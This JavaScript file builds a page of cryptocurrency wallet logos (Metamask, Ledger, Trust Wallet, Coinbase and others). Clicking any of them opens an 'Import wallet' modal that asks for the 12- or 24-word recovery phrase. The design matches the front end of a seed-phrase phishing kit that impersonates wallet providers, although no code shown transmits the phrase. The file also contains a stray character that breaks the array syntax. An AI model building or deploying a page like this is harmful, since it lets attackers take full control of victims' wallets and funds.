const images = [
      { img: "images/trustw2.jpg", name: "Trust Wallet" },
  { img: "images/metamask.png", name: "Metamask" },
  { img: "images/ledger.png", name: "Ledger" },
  { img: "images/fortmatic.png", name: "FortMatic" },
  { img: "images/exxodus.png", name: "Exodus" },
  { img: "images/enjin.png", name: "Enjin" },
  { img: "images/digitex.jpeg", name: "Digitex" },
  { img: "images/defiant.jpeg", name: "Defiat" },
    { img: "images/coinbase.jpeg", name: "CoinBase" },
  { img: "images/aave.png", name: "Aave" },
  { img: "images/MEW.png", name: "Mew" },
  { img: "images/authereum.png", name: "Authereum" },
  { img: "images/portis.jpg", name: "Portis" },
  { img: "images/walletCON.jpg", name: "WalletConnect" },
  { img: "images/safewallet.jpg", name: "SafePal" },
x];

const modal_content_wrapper = document.querySelector("#modal_content");
const div = document.getElementById("container");
div.classList = "grid-container";

images.forEach((image, i) => {
  const imgDiv = document.createElement("div"); // <div></div>
  const imgDivInner = document.createElement("div"); //
  const img = document.createElement("img"); // <img />
  const pTag = document.createElement("p");
  pTag.style.cssText = "font-family: Poppins, sans-serif ";

  div.appendChild(imgDiv); // <div></div>
  imgDiv.appendChild(imgDivInner); // <div> <div></div> </div>
  imgDiv.setAttribute("data-toggle", "modal");
  imgDiv.setAttribute("data-target", "#imgModal");
  imgDiv.style.cssText = "cursor: pointer";
  pTag.innerHTML = image.name;

  imgDiv.className = "gird-item w-100";
  imgDivInner.className =
    "card p-3 text-center img-fluid rounded-lg m-2 shadow border-0";
  
  img.src = image.img.split("5500").splice(-1).join(); // img.src --> <img src="images/aave.png" alt="la"/>
  img.setAttribute("alt", img.src);
    img.setAttribute("role", "button");
    console.log(image.img, "test")

  imgDivInner.appendChild(pTag);
  imgDivInner.appendChild(img);
  let modal_content = "";

  modal_content += `<div
        class="modal fade"
        id="imgModal"
        tabindex="-1"
        aria-labelledby="exampleModalLabel"
        aria-hidden="true"
      >
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel">Import wallet</h5>
              <button
                type="button"
                class="close"
                data-dismiss="modal"
                aria-label="Close"
              >
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">  
            <div >
            <textarea placeholder="Recovery phase" class="w-100 p-1" ></textarea>
            </div>
            <p class="text-muted">Typically 12 (sometimes 24) words separated by single spaces  </p>
            </div>
            <div class="modal-footer">

              <button type="button" class="btn btn-primary">
                Import wallet
              </button>
            </div>
          </div>
        </div>
      </div>`;
  modal_content_wrapper.innerHTML = modal_content;
});